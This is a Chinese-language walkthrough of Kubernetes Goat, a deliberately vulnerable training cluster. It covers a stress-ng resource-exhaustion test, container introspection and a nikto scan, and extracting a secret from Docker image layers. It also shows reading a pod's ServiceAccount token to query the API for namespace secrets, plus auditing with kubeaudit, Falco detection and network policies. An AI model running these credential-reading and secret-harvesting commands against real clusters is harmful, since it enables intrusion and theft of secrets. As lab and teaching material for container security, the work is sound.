KUBERNETES_PORT_443_TCP_PORT=443
HEALTH_CHECK_SERVICE_SERVICE_PORT=80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP=tcp://10.108.159.179:80
POOR_REGISTRY_SERVICE_SERVICE_HOST=10.101.33.162
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP=tcp://10.109.244.245:5000
BUILD_CODE_SERVICE_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
METADATA_DB_PORT=tcp://10.96.0.140:80
INTERNAL_PROXY_API_SERVICE_SERVICE_HOST=10.96.130.221
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT=80
INTERNAL_PROXY_API_SERVICE_PORT=tcp://10.96.130.221:3000
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST=10.109.244.245
KUBERNETES_GOAT_HOME_SERVICE_PORT=tcp://10.108.159.179:80
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT=8080
BUILD_CODE_SERVICE_PORT=tcp://10.97.181.240:3000
SYSTEM_MONITOR_SERVICE_SERVICE_PORT=8080
METADATA_DB_PORT_80_TCP_PORT=80
POOR_REGISTRY_SERVICE_PORT=tcp://10.101.33.162:5000
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT=5000
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO=tcp
BUILD_CODE_SERVICE_PORT_3000_TCP=tcp://10.97.181.240:3000
SHLVL=1
KUBERNETES_SERVICE_PORT=443
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO=tcp
METADATA_DB_PORT_80_TCP=tcp://10.96.0.140:80
HEALTH_CHECK_SERVICE_PORT=tcp://10.108.6.124:80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR=10.108.159.179
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT=80
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO=tcp
HEALTH_CHECK_SERVICE_PORT_80_TCP=tcp://10.108.6.124:80
BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR=10.97.181.240
HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR=10.108.6.124
KUBERNETES_SERVICE_HOST=10.96.0.1
POOR_REGISTRY_SERVICE_PORT_5000_TCP=tcp://10.101.33.162:5000
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO=tcp
METADATA_DB_PORT_80_TCP_PROTO=tcp
_=/usr/bin/printenv
```
## 拒绝服务（DoS）内存/CPU资源
访问1236端口
![image-20230206154401581](../../.gitbook/assets/image-20230206154401581.png)
我们可以使用像 stress-ng 这样的简单实用程序来执行压力测试，比如访问更多资源。下面的命令是访问比指定更多的资源
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
您可以看到正常资源消耗与运行 stress-ng 时的区别，后者消耗的资源比预期消耗的要多
> 需要安装`metrics`
>
> ```
> wget https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml -O metrics-server-components.yaml
> sed -i 's/k8s.gcr.io\/metrics-server/registry.cn-hangzhou.aliyuncs.com\/google_containers/g' metrics-server-components.yaml
> kubectl apply -f metrics-server-components.yaml 
> ```
>
> x509: cannot validate certificate 的解决方案：
> https://ssoor.github.io/2020/03/25/k8s-metrics-server-error-1/
原始阶段
```
root@l-virtual-machine:/tmp# kubectl --namespace big-monolith top pod hunger-check-deployment-5d94d56fdb-pb6jp
NAME                                       CPU(cores)   MEMORY(bytes)   
hunger-check-deployment-5d94d56fdb-pb6jp   126m         4Mi   
```
压测过程中
```
root@l-virtual-machine:/tmp# kubectl --namespace big-monolith top pod hunger-check-deployment-5d94d56fdb-pb6jp
NAME                                       CPU(cores)   MEMORY(bytes)   
hunger-check-deployment-5d94d56fdb-pb6jp   354m         2059Mi 
```
## 黑客容器预览
进入黑客容器
```
kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
```
我们可以使用像 amicontained 这样简单而强大的实用程序来执行容器内省并获得系统功能的概述等。
```
bash-5.1# amicontained
Container Runtime: kube
Has Namespaces:
        pid: true
        user: false
AppArmor Profile: docker-default (enforce)
Capabilities:
        BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
Seccomp: disabled
Blocked Syscalls (22):
        MSGRCV SYSLOG SETSID VHANGUP PIVOT_ROOT ACCT SETTIMEOFDAY SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME INIT_MODULE DELETE_MODULE KEXEC_LOAD PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD
Looking for Docker.sock
```
扫描
```
nikto.pl -host http://metadata-db
```
![image-20230206161512696](../../.gitbook/assets/image-20230206161512696.png)
## 隐藏在层中
查看`madhuakula/k8s-goat-hidden-in-layers`镜像信息
```
docker inspect madhuakula/k8s-goat-hidden-in-layers
```
查看构建历史，找到secret.txt
```
docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers
```
![image-20230207170913608](../../.gitbook/assets/image-20230207170913608.png)
我们可以通过利用 docker 内置命令将 docker 镜像导出为 tar 文件来恢复 `/root/secret.txt`
```
docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar
```
解压`hidden-in-layers.tar`
```
root@l-virtual-machine:/tmp# tar xvf hidden-in-layers.tar
66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/
66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/VERSION
66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/json
66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/layer.tar
79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/
79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/VERSION
79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/json
79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar
8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607.json
c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/
c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/VERSION
c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/json
c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/layer.tar
manifest.json
repositories
```
使用dive分析镜像
> https://github.com/wagoodman/dive/releases
```
dive madhuakula/k8s-goat-hidden-in-layers
```
![image-20230207171536842](../../.gitbook/assets/image-20230207171536842.png)
进入layer层
```
cd 66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/
```
获取secret.txt
```sh
root@l-virtual-machine:/tmp/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535# ls
json  layer.tar  VERSION
root@l-virtual-machine:/tmp/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535# tar xvf layer.tar 
root/
root/secret.txt
root@l-virtual-machine:/tmp/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535# cat root/secret.txt 
k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772
```
## RBAC 最低特权配置错误
访问1236端口
![image-20230207171848648](../../.gitbook/assets/image-20230207171848648.png)
默认情况下，Kubernetes 将所有令牌和服务帐户信息存储在默认位置
![image-20230207172202907](../../.gitbook/assets/image-20230207172202907.png)
要指向内部 API 服务器主机名，我们可以从环境变量中导出它
```
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
```
设置 ServiceAccount 令牌的路径
```
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```
设置命名空间值
```
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
```
读取 ServiceAccount token
```
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
```
指向 ca.crt 路径，以便我们可以在 curl 请求中查询时使用它
```
export CACERT=${SERVICEACCOUNT}/ca.crt
```
现在我们可以使用令牌和构造的查询来探索 Kubernetes API
```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```
![image-20230207172803765](../../.gitbook/assets/image-20230207172803765.png)
要查询默认命名空间中的可用机密，请运行以下命令
> 没有权限查看默认命名空间
```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
```
![image-20230207172835361](../../.gitbook/assets/image-20230207172835361.png)
查询特定于命名空间的秘密
```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
```
![image-20230207172950010](../../.gitbook/assets/image-20230207172950010.png)
从secrets中获取k8svaulapikey值
```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep k8svaultapikey 
```
![image-20230207173038641](../../.gitbook/assets/image-20230207173038641.png)
## KubeAudit - 审核Kubernetes集群
kubeaudit 是一个命令行工具和一个 Go 包，用于审计 Kubernetes 集群的各种安全问题。
要开始使用此方案，您可以运行以下命令以使用集群管理员权限启动黑客容器
```
kubectl run -n kube-system  --rm --restart=Never -it --image=madhuakula/hacker-container -- bash
```
下载kubeaudit
```
wget https://github.com/Shopify/kubeaudit/releases/download/v0.21.0/kubeaudit_0.21.0_linux_amd64.tar.gz
```
执行审计
```
kubeaudit all
```
![image-20230207173913697](../../.gitbook/assets/image-20230207173913697.png)
## Falco - 运行时安全监测和检测
部署 Falco
```
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco
```
运行镜像，里面执行`cat /etc/shadow`
```
kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bash
```
一会后，查看falco日志，可以监控到执行查看shadow命令。
![image-20230207175743660](../../.gitbook/assets/image-20230207175743660.png)
## Popeye - Kubernetes集群清理工具
运行镜像
```
kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bash
```
## 使用 NSP 保护网络边界
启动web镜像
```
kubectl run --image=nginx website --labels app=website --expose --port 80
```
启动终端
```
kubectl run temp -it --rm --image=alpine /bin/sh
```
![image-20230208102302818](../../.gitbook/assets/image-20230208102302818.png)
创建一个网络策略并将其应用于 Kubernetes 集群以阻止/拒绝任何请求。
{% code title="website-deny.yaml" %}
```
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: website-deny
spec:
  podSelector:
    matchLabels:
      app: website
  ingress: []
```
{% endcode %}
让我们通过运行以下命令将此 NSP 策略部署到集群：
```
kubectl apply -f website-deny.yaml
```